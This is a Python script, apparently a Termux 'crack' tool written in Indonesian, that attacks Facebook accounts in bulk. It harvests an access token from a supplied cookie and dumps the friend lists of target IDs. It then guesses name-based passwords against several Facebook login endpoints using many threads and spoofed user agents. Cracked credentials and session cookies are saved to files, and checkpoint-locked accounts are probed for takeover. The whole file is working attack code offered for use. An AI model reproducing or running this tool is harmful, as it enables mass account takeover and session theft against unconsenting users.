#KONTOLODON#
#KONTOLODON#

import requests,json,os,sys,random,datetime,time,re
from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn,TimeElapsedColumn
from concurrent.futures import ThreadPoolExecutor as tred
from rich.markdown import Markdown as mark
from rich.console import Console as sol
from rich.panel import Panel as nel
from rich.panel import Panel as panel
from rich import print as cetak
from rich.tree import Tree
from rich.style import Style
from bs4 import BeautifulSoup as sop
from rich import pretty
import socket
hostname = socket.gethostname()
IPAddr = socket.gethostbyname(hostname)
import os
import random
import sys
import time
from rich import pretty
pretty.install()
CON=sol()

pretty.install()
CON=sol()
ugen2=[]
ugen=[]
cokbrut=[]
uapi,uatol=[],[]
ses=requests.Session()
princp=[]

for jiah in range(1000):
	rr = random.randint
	rc = random.choice
	HP1 = 'HM 1S Build/KTU84P'
	HP2 = 'HM 1S'
	HP3 = 'HM'
	card = 'XL'
	iki=f'Dalvik/2.1.0 (Linux; U; Android {str(rr(10,12))}; vivo 2019 Build/QP1A.190711.020) [FBAN/MessengerLite;FBAV/{str(rr(300,329))}.0.0.{str(rr(1,8))}.{str(rr(90,106))};FBPN/com.facebook.mlite;FBLC/in_ID;FBBV/{str(rr(400000000,500000000))};FBCR/Indosat Ooredoo;FBMF/vivo;FBBD/vivo;FBDV/vivo 2019;FBSV/{str(rr(6,10))};FBCA/arm64-v8a:null;FBDM/'+'{density=2.0,width=720,height=1412};]'
	uapi.append(iki)

for jiah in range(1000):
	rr = random.randint
	rc = random.choice
	aa = ['tr-tr','en-gb','en-us','ar-ae','de-de','ko-kr','th-th','en-au','fa-ir','de-de','zh-cn','nl-nl','pt-br','ru-ru','id-id','zk-hk','sr-rs']
	bb = ['535.19','535.36','535.37']
	aZ = ['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']
	ab='Mozilla/5.0 (Linux; Android'
	b=random.choice(['6','7','8','9','10','11','12'])
	c='GT-'
#	c='SM-'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(600, 9999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0  Chrome/'
#	g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	h=random.randrange(50,100)
	i='0'
	j=random.randrange(3000,4000)
	k=random.randrange(60,150)
	l='Mobile Safari/537.36'
	iko=f'{ab} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	uatol.append(iko)

id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]
cokbrut=[]
pwpluss,pwnya=[],[]
uadia, uadarimu = [],[]
pwlist,pwlis,pwkota,pwk= [],[],[],[]
detek= []

P = '\033[97m'  # PUTIH
x = '\033[97m' # DEFAULT
m = '\x1b[91m' #RED +
k = '\033[93m' # KUNING +
h = '\x1b[92m' # HIJAU +
hh = '\033[92m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[96m' # BIRU -
asu = random.choice([m,k,h,u,b])

dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
akc = 'OK '+str(tgl)+' '+str(bln)+' '+str(thn)
apc = 'CP '+str(tgl)+' '+str(bln)+' '+str(thn)
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'

#def renv_xy(u):
#        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.005)
def clear():
	os.system('clear')
def back():
	login()

def banner():
	print(f'''{asu}
wes ngerti kan aku SHIN-ZY
na ojo di jual rek, ojo di mbeno sopo" 
aku pegel anggite gawe script gk turu"
 ________  ______  _______  ________ _     __ 
 |        |_____/  |_____|  |        |____/  
 |_____   |    \_  |     |  |_____   |    \__ 
jangan lupa ngocok pakai balsem ya {x}''')

def batas():
	print (f'{asu}─────────────────────────────────────────────{x}')

def login():
	print("-----------------------------------------------------------")
	cok = input("[f] masukkan cookie : ")
	try:
		head = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36"}
		link = ses.get("https://web.facebook.com/adsmanager?_rdc=1&_rdr", headers=head, cookies={"cookie": cok})
		#exit(link.text)
		find = re.findall('act=(.*?)&nav_source', link.text)
		if len(find) == 0:print("[!] Cookie kamu invalid");time.sleep(2);masuk()
		else:
			for x in find:
				jnck = ses.get(f"https://web.facebook.com/adsmanager/manage/campaigns?act={x}&nav_source=no_referrer", headers = head, cookies={"cookie": cok})
				took = re.search('(EAAB\w+)', jnck.text).group(1)
				open('.token.txt', 'a').write(took);open('.cok.txt', 'a').write(cok)
				print(f"\n[✓] token anda: {took}")
				exit("\n [✓] jalankan perintah ulang !!!")
	except Exception as e:
		print(e)

def menu():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except (FileNotFoundError, KeyError):
		print('[×] Expired Cookies ')
		time.sleep(2)
		login()
	os.system('clear')
	banner()
	print('')
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		exit()
	batas()
#	print(f"{h}{cok}\n{token}")
	print(f'> {P}[{h}00{P}] ganti cookies\n{P}> [{h}01{P}] crack massal')
	batas()
	kl = input(f'{x}> target : ')
	if kl in ['0','00']:
		os.system('rm -rf .token.txt')
		os.system('rm -rf .cookie.txt')
		print(f'{h}> cookies berhasil dihapus')
	if kl in ['1','01']:
		dump_massal()
	else:
		uid.append(kl)
	batas()
	for userr in uid:
		try:
			col = ses.get('https://graph.facebook.com/v2.0/'+userr+'?fields=friends.limit(5000)&access_token='+token, cookies = {'cookies':cok}).json()
			for mi in col['friends']['data']:
				try:
					iso = (mi['id']+'|'+mi['name'])
					if iso in id:pass
					else:id.append(iso)
					sys.stdout.write(f"\r> teman  : {h}{len(id)}{x}");sys.stdout.flush()
				except:continue
		except Exception as e:
			print(f"> akun tidak publik");time.sleep(2);exit()
	try:
		setting()
	except requests.exceptions.ConnectionError:
		print(f'{x}')
		print(' NO SINYAL ')
		back()
	except (KeyError,IOError):
		print(f'{k} ERROR SYSTEM {x}')
		time.sleep(3)
		back()

def dump_massal():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		exit()
	try:
		jum = int(input(f'> crack berapa id ? : '))
	except ValueError:
		print(' > wrong input ')
		exit()
	if jum<1 or jum>5:
		print(f' > maksimal hanya 5 id saja agar tidak terkena spam ip ');time.sleep(2);back()
		exit()
	ses=requests.Session()
	yz = 0
	for met in range(jum):
		yz+=1
		kl = input(f'> masukan id ke-'+str(yz)+' : ')
		uid.append(kl)
	for userr in uid:
		try:
			col = ses.get('https://graph.facebook.com/v2.0/'+userr+'?fields=friends.limit(5000)&access_token='+token, cookies = {'cookies':cok}).json()
			for mi in col['friends']['data']:
				try:
					iso = (mi['id']+'|'+mi['name'])
					if iso in id:pass
					else:id.append(iso)
					sys.stdout.write(f"\r> teman  : {h}{len(id)}{x}");sys.stdout.flush()
				except:continue
		except Exception as e:
			print(f"> akun tidak publik");time.sleep(2);exit()
	try:
		setting()
	except requests.exceptions.ConnectionError:
		print(f'{x}')
		print(' NO SINYAL ')
		back()
	except (KeyError,IOError):
		print(f'{k} ERROR SYSTEM {x}')
		time.sleep(3)
		back()

def setting():
	muda=[]
	for bacot in sorted(id):
		muda.append(bacot)
	bcm=len(muda)
	bcmi=(bcm-1)
	for xmud in range(bcm):
		id2.append(muda[bcmi])
		bcmi -=1

	print(f"")
	batas()
	pwku=input(f'> sandi tambahan(karepmu) : ')
	pwkuh=pwku.split(',')
	for xpw in pwkuh:
		pwnya.append(xpw)
	batas()
	print(f'> {P}[{h}01{P}] validate\n{P}> [{h}02{P}] reguler\n{P}> [{h}03{P}] api ')
	batas()
	kek=input(f'> pilih  : ')
	batas()
	if kek in ['1','01']:
		print(f'''> {P}[{h}01{P}] metode mobile\n{P}> [{h}02{P}] metode free\n{P}> [{h}03{P}] metode mbasic\n{P}> [{h}04{P}] metode x.fb\n{P}> [{h}05{P}] metode touch''')
		batas()
		kon=input(f'> pilih  : ')
		if kon in ['1','01']:method.append('validmobile')
		elif kon in ['2','02']:method.append('validfree')
		elif kon in ['3','03']:method.append('validmbasic')
		elif kon in ['4','04']:method.append('validxfb')
		elif kon in ['5','05']:method.append('validtouch')
		else:setting()
	elif kek in ['2','02']:
		print(f'''> {P}[{h}01{P}] metode mobile\n{P}> [{h}02{P}] metode free\n{P}> [{h}03{P}] metode mbasic\n{P}> [{h}04{P}] metode x.fb\n{P}> [{h}05{P}] metode touch''')
		batas()
		kon=input(f'> pilih  : ')
		if kon in ['6','06']:method.append('regmobile')
		elif kon in ['7','07']:method.append('regfree')
		elif kon in ['8','08']:method.append('regmbasic')
		elif kon in ['9','09']:method.append('regxfb')
		elif kon in ['10']:method.append('regtouch')
	elif kek in ['3','03']:method.append('Api')
	else:method.append('Api')
	batas()
	passwrd()

def passwrd():
	global prog,des
	print(f'> {P}[{h}01{P}] crack cepat\n{P}> [{h}02{P}] crack super cepat\n{P}> [{h}03{P}] crack lambat\n{P}> [{h}04{P}] crack super lambat ')
	batas()
	speednya=input(f'> pilih  : ')
	if speednya in ['1','01']:speed = 50	
	elif speednya in ['2','02']:speed = 70
	elif speednya in ['3','03']:speed = 30
	elif speednya in ['4','04']:speed = 15
	else:speed = 100
	batas()
	prog = Progress(TextColumn('{task.description}'))
	des = prog.add_task('',total=len(id2))
	with prog:
		with tred(max_workers=speed) as pool:
			for yuzong in id2:
				idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
				frs = nmf.split(' ')[0]
				pwv=[nmf,frs+'123',frs+'1234',frs+'12345',frs+'123456','sayang','kontol']
#				pwv=[nmf,frs+'123',frs+'12345']
				for xpwd in pwnya:pwv.append(xpwd)
				if 'regmobile' in method:pool.submit(reg,idf,pwv,nmf,"m.facebook.com")
				elif 'regmbasic' in method:pool.submit(reg,idf,pwv,nmf,"mbasic.facebook.com")
				elif 'regfree' in method:pool.submit(reg,idf,pwv,nmf,"free.facebook.com")
				elif 'regxfb' in method:pool.submit(reg,idf,pwv,nmf,"x.facebook.com")
				elif 'regtouch' in method:pool.submit(reg,idf,pwv,nmf,"touch.facebook.com")
				elif 'validmobile' in method:pool.submit(crack,idf,pwv,nmf,"m.facebook.com")
				elif 'validmbasic' in method:pool.submit(crack,idf,pwv,nmf,"mbasic.facebook.com")
				elif 'validfree' in method:pool.submit(crack,idf,pwv,nmf,"free.facebook.com")
				elif 'validxfb' in method:pool.submit(crack,idf,pwv,nmf,"x.facebook.com")
				elif 'validtouch' in method:pool.submit(crack,idf,pwv,nmf,"touch.facebook.com")
				elif 'Api' in method:pool.submit(Api,idf,pwv)				
				else:pool.submit(Api,idf,pwv)
	print()
	#	os.system("play-audio /sdcard/KONTOLODON/SELESAI.mp3")
	cek_opsi()
#def convert(cookie):
#        coki = ('datr=%s;sb=%s;c_user=%s;xs=%s;fr=%s'%(cookie['datr'],cookie['sb'],cookie['c_user'],cookie['xs'],cookie['fr']))
#        return(str(coki))
def convert(cooz):
        coki = "datr=" + cooz["datr"] + ";" + ("sb=" + cooz["sb"]) + ";" + ("c_user=" + cooz["c_user"]) + ";" + ("xs=" + cooz["xs"]) + ";" + ("fr=" + cooz["fr"])
        return(str(coki))

def cepe(kuntul):
        coco = "datr=" + kuntul["datr"] + ";" + ("sb=" + kuntul["sb"]) + ";" + "locale=id_ID" + ";" + ("checkpoint=" + kuntul["checkpoint"]) + ";" + ("fr=" + kuntul["fr"])
        return(str(coco))

def Api(idf,pwv):
	global loop,ok,cp
	asu = random.choice([m,k,h,u,b])
	usa = random.choice([b,u,h,k,m])
	uss = random.choice([h,k,b,m,u])
	met = random.choice([h,k,P])
	prog.update(des,description=f"> {met}{idf}|{b}{str(loop)}{met}/{b}{len(id2)}{met} [[green]OK-{ok}{met}] [[yellow3]CP-{cp}{met}]")
	prog.advance(des)
	uazz = random.choice(uapi)
	ses = requests.Session()
	for pw in pwv:
		try:
			ykh = random.randint(2e7, 3e7)
			iyh = random.randint(2e4, 4e4)
			head = {'Host':'graph.facebook.com','x-fb-connection-bandwidth': repr(ykh), 'x-fb-sim-hni': repr(iyh), 'x-fb-net-hni': repr(iyh),'x-fb-connection-quality': 'EXCELLENT','user-agent': uazz,'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
			date = {'access_token': '200424423651082|2a9918c6bcd75b94cefcbb5635c6ad16',  'format': 'JSON', 'sdk_version': {random.randrange(2, 31)}, 'email': idf, 'locale': 'id_ID', 'password': pw, 'sdk': 'android', 'generate_session_cookies': '1', 'sig': f'{random.randrange(1, 9)}f{random.randrange(100, 999)}f{random.randrange(10, 99)}fb{random.randrange(10, 99)}fcd{random.randrange(1, 9)}aa{random.randrange(0, 9)}c{random.randrange(10, 99)}f{random.randrange(10, 99)}f{random.randrange(100, 999)}ef{random.randrange(1, 9)}'}
			xnxx = ses.post("https://graph.facebook.com/auth/login", params=date, headers=head, allow_redirects=False)
			anjg = json.loads(xnxx.text)
			if "session_key" in xnxx.text:
				ok+=1
				coki = anjg["session_cookies"]
				cok = {}
				for x in coki:
					cok.update({x["name"]:x["value"]})
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in cok.items() ])
#				print(f'> {h}{idf}|{pw}{x}')
				tree = Tree("                                 ")
				tree.add(f"[bold green]{idf}|{pw}")
				tree.add(f"[bold green]{kuki}")
#				tree.add(f"[bold green]{uazz}")
				cetak(tree)
				open('/sdcard/OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
				ok.append(idf)
				break
			elif "checkpoint" in xnxx.text:
				cp+=1
#				print(f'> {k}{idf}|{pw}{x}')
				tree = Tree("                                 ")
				tree.add(f"[bold yellow]{idf}|{pw}")
#				tree.add(f"{K2}{uazz}")
				cetak(tree)
				open('/sdcard/CP/'+cpc,'a').write(idf+'|'+pw+f'   {uazz}''\n')
				akun.append(idf+'|'+pw)
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1

def crack(idf,pwv,nmf,url):
	global loop,ok,cp
	get = f"/login/device-based/password/?uid={idf}&flow=login_no_pin&refsrc=deprecated&locale2=id_ID&_rdr"
	nex = f"https://mobile.facebook.com/?_rdr&tbua=1"
	pos = f"/login/device-based/validate-password/?shbl=0"
	asu = random.choice([m,k,h,u,b])
	usa = random.choice([b,u,h,k,m])
	uss = random.choice([h,k,b,m,u])
	met = random.choice([h,k])
	ua = random.choice(uatol)
	ses = requests.Session()
	prog.update(des,description=f"> {met}{idf}|{b}{str(loop)}{met}/{b}{len(id2)}{met} [[green]OK-{ok}{met}] [[yellow3]CP-{cp}{met}]")
	prog.advance(des)
	for pw in pwv:
		try:
			g = ses.get(f"https://{url}{get}")
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(g.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(g.text)).group(1),
                  "uid":idf,
#			"next": f"{nex}",
			"flow": "login_no_pin",
                  "pass":pw,}
			head={"Host": f"{url}","connection": "keep-alive","cache-control": "max-age=0","save-data": "on","origin": f"{url}","content-type": "application/x-www-form-urlencoded",
			"user-agent": ua,
			"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "XMLHttpRequest","dnt": "1","sec-ch-ua": '" Not A;Brand";v="99", "Chromium";v="104"',"sec-ch-ua-platform": '"Android"',"sec-ch-ua-mobile": "?1","sec-fetch-site": "same-origin","sec-fetch-mode": "cors","sec-fetch-dest": "empty","sec-fetch-user": "?1","upgrade-insecure-requests": "1","referer": f"https://{url}{get}","accept-encoding": "gzip, deflate br","accept-language": "en-GB,en-US;q=0.9,en;q=0.8"}
			p = ses.post(f"https://{url}{pos}",data=dataa,headers=head,allow_redirects=False)
			if "checkpoint" in p.cookies.get_dict().keys():
#				coco=(";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				coco=cepe(ses.cookies.get_dict())
				cp+=1
#				print(f'> {k}{idf}|{pw}\n{coco}{x}')
				tree = Tree(f"")
				tree.add(f"[bold yellow]{idf}|[bold yellow]{pw}\n[bold yellow]{coco}")
				cetak(tree)
#				os.system("play-audio /sdcard/KONTOLODON/CP.mp3")
#				os.system("play-audio /sdcard/KONTOLODON/CPS.mp3")
				open('/sdcard/CP/'+cpc,'a').write(idf+'|'+pw+f'   {ua}''\n')
				akun.append(idf+'|'+pw)
				break
			elif "c_user" in ses.cookies.get_dict().keys():
#				coki=(";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				coki=convert(ses.cookies.get_dict())
				ok+=1
#				print(f'> {h}{idf}|{pw}\n{coki}{x}')
				tree = Tree(f"")
				tree.add(f"[bold green]{idf}|[bold green]{pw}\n[bold green]{coki}")
				cetak(tree)
#				os.system("play-audio /sdcard/KONTOLODON/OK.mp3")
#				os.system("play-audio /sdcard/KONTOLODON/OKS.mp3")
				open('/sdcard/OK/'+okc,'a').write(idf+'|'+pw+'|'+coki+'\n')
				break
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
def reg(idf,pwv,nmf,url):
	global loop,ok,cp
#	get = '/login/?privacy_mutation_token=eyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNjcwOTA0MjEwLCJjYWxsc2l0ZV9pZCI6MTA0NzY5OTU1NTY3NjEwMX0%3D&next=https%3A%2F%2Fdevelopers.facebook.com%2Fdocs%2Fgraph-api&_rdc=1&_rdr'
#	pos = '/login/device-based/login/async/?next=https://developers.facebook.com/docs/graph-api&refsrc=deprecated&lwv=100'
	get = f"/login.php?skip_api_login=1&api_key=966242223397117&signed_next=1&next=https://m.facebook.com/sharer/sharer.php?u=https%3A%2F%2Fabout.fb.com%2Fnews%2F2021%2F09%2Fbuilding-the-metaverse-responsibly%2F&src=sdkpreparse&cancel_url=https://m.facebook.com/dialog/close_window/?app_id=966242223397117&connect=0#_=_&display=popup&locale=id_ID"
	pos = f"/login/device-based/login/async/?api_key=966242223397117&auth_token=1b21b9fbdb8da6c10295d5bf532fa02a&skip_api_login=1&signed_next=1&next=https://m.facebook.com/sharer/sharer.php?u=https%3A%2F%2Fabout.fb.com%2Fnews%2F2021%2F09%2Fbuilding-the-metaverse-responsibly%2F&src=sdkpreparse&refsrc=deprecated&app_id=966242223397117&cancel=https://m.facebook.com/dialog/close_window/?app_id=966242223397117&connect=0#_=_&lwv=100"
	asu = random.choice([m,k,h,u,b])
	usa = random.choice([b,u,h,k,m])
	uss = random.choice([h,k,b,m,u])
	met = random.choice([h,k])
	ua = random.choice(uatol)
	ses = requests.Session()
	prog.update(des,description=f"> {met}{idf}|{b}{str(loop)}{met}/{b}{len(id2)}{met} [[green]OK-{ok}{met}] [[yellow3]CP-{cp}{met}]")
	prog.advance(des)
	for pw in pwv:
		try:
			g = ses.get(f"https://{url}{get}")
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(g.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(g.text)).group(1),
                  "email":idf,
                  "pass":pw,}
			head={"Host": f"{url}","connection": "keep-alive","cache-control": "max-age=0","save-data": "on","origin": f"{url}","content-type": "application/x-www-form-urlencoded",
			"user-agent": ua,
			"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "XMLHttpRequest","dnt": "1","sec-ch-ua": '" Not A;Brand";v="99", "Chromium";v="104"',"sec-ch-ua-platform": '"Android"',"sec-ch-ua-mobile": "?1","sec-fetch-site": "same-origin","sec-fetch-mode": "cors","sec-fetch-dest": "empty","sec-fetch-user": "?1","upgrade-insecure-requests": "1","referer": f"https://{url}{get}","accept-encoding": "gzip, deflate br","accept-language": "en-GB,en-US;q=0.9,en;q=0.8"}
			p = ses.post(f"https://{url}{pos}",data=dataa,headers=head,allow_redirects=False)
			if "checkpoint" in p.cookies.get_dict().keys():
#				coco=(";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				coco=cepe(ses.cookies.get_dict())
				cp+=1
				tree = Tree(f"")
				tree.add(f"[bold yellow]{idf}|[bold yellow]{pw}\n[bold yellow]{coco}")
				cetak(tree)
#				os.system("play-audio /sdcard/KONTOLODON/CP.mp3")
#				os.system("play-audio /sdcard/KONTOLODON/CPS.mp3")
				open('/sdcard/CP/'+cpc,'a').write(idf+'|'+pw+f'   {ua}''\n')
				akun.append(idf+'|'+pw)
				break
			elif "c_user" in ses.cookies.get_dict().keys():
#				coki=(";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				coki=convert(ses.cookies.get_dict())
				ok+=1
				tree = Tree(f"")
				tree.add(f"[bold green]{idf}|[bold green]{pw}\n[bold green]{coki}")
				cetak(tree)
#				os.system("play-audio /sdcard/KONTOLODON/OK.mp3")
#				os.system("play-audio /sdcard/KONTOLODON/OKS.mp3")
				open('/sdcard/OK/'+okc,'a').write(idf+'|'+pw+'|'+coki+'\n')
				break
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
#-----------------[ OPSI CP ]-----------------#
def cek_opsi():
    c = len(akun)
    print(f' > TOTAL {b}%s{x} ID UNTUK DI CEK\n{m}─────────────────────────────────────────────{x}'%(c))
    print()
    print(f' > SILAHKAN ON/OFF MODE PESAWAT DULU !!')
    print()
    input (f' > TEKAN ENTER UNTUK ⬅ {h} MULAI\n{m}─────────────────────────────────────────────{x}')
    love = 1
    for kes in akun:
        try:
            idfs,pws ,tl= kes.split('|')[0],kes.split('|')[1],kes.split('|')[2]
        except:
            idfs,pws= kes.split('|')[0],kes.split('|')[1]
            tl='-'
        print(f'\n > SEDANG LOGIN %s {b}%s/%s\n{m}─────────────────────────────────────────────{x}'%(idfs,love,len(akun)));sys.stdout.flush()
        cekopsii(idfs,pws,tl)
        love+=1

def cekopsii(id,pw,ttl):
    try:
        req=requests.Session()
        head={"Host":"mbasic.facebook.com","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9","referer":"https://mbasic.facebook.com/","user-agent":"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]"}
        a=sop(req.get('https://mbasic.facebook.com/?locale=id_ID&_rdr').text,'html.parser')
        porm=a.find('form')
        dataa = {}
        lion = ['lsd','jazoest','m_ts','li','try_number','unrecognized_tries','email','pass','login','bi_xrwh']
        for anj in porm('input'):
            if anj.get('name') in lion:
                if 'pass' ==anj.get('name'):
                    dataa.update({anj.get('name'): pw})
                elif 'email' in anj.get('name'):
                    dataa.update({anj.get('name'): id})
                else:
                    dataa.update({anj.get('name'):anj.get('value')})
        b=sop(req.post('https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8',data=dataa,headers=head,allow_redirects=True).text,'html.parser')
        kuki = (";").join([ "%s=%s" % (key, value) for key, value in req.cookies.get_dict().items() ])
        coki=req.cookies.get_dict()
        if "checkpoint" in req.cookies.get_dict().keys():
            try:
                ampromm=b.find('form')
                amdat=['fb_dtsg','fb_dtsg','jazoest','jazoest','checkpoint_data=','submit[Continue]','nh']
                amdata={}
                for enj in ampromm('input'):
                    if enj.get('name') in amdat:
                        amdata.update({enj.get('name'):enj.get('value')})
                cc=req.post('https://mbasic.facebook.com/login/checkpoint/?locale2=id_ID', cookies=coki, headers=head,data=amdata).text
                c=sop(cc,'html.parser')
                opsi=c.find_all('option')
                no=1
                opsinya=''
                for opsii in opsi:
                    opsinya+=f'[{no}] {opsii.text} \n'
                    no+=1
                if opsinya=='':
                    open("/sdcard/OK/.txt" ,'a').write(id+'|'+pw+'\n')
                    tree = Tree("SUKSES LOGIN")
                    tree.add(f"[bold green]TAP YES / A2F ON").add(f"[bold green]{id}|[bold green]{pw}\n")
                    cetak(tree)
                else:
                    tree = Tree("SUKSES LOGIN")
                    tree.add(f"[yellow]TERDAPAT OPSI").add(f"[yellow]{id}|[yellow]{pw}").add(f"[cyan]{opsinya}")
                    cetak(tree)
            except:
                print('\n\r')
                tree = Tree("GAGAL LOGIN")
                tree.add(f"[yellow]GAGAL CEK OPSI / JARINGAN TIDAK STABIL").add(f"[yellow]{id}|[yellow]{pw}\n")
                cetak(tree)
        
        
        elif "c_user" in req.cookies.get_dict().keys():
            print('\n\r')
            open('/sdcard/OK/'+okc,'a').write(id+'|'+pw+kuki+'\n')
            tree = Tree("SUKSES LOGIN")
            tree.add(f"[green]HOREE AKUN CP JADI OK").add(f"[green]{id}|[green]{pw}\n")
            cetak(tree)
        else:
            print('\n\r')
            tree = Tree("GAGAL LOGIN")
            tree.add(f"[red]PASSWORD SALAH / SPAM").add(f"[yellow]{id}|[yellow]{pw}\n")
            cetak(tree)
    except requests.exceptions.ConnectionError:
        time.sleep(10)
        cekopsii(id, pw,ttl)


if __name__=='__main__':
	try:os.mkdir('/sdcard/OK')
	except:pass
	try:os.mkdir('/sdcard/CP')
	except:pass
	try:os.mkdir('/sdcard/TABYES')
	except:pass
	menu()

#KONTOLODON#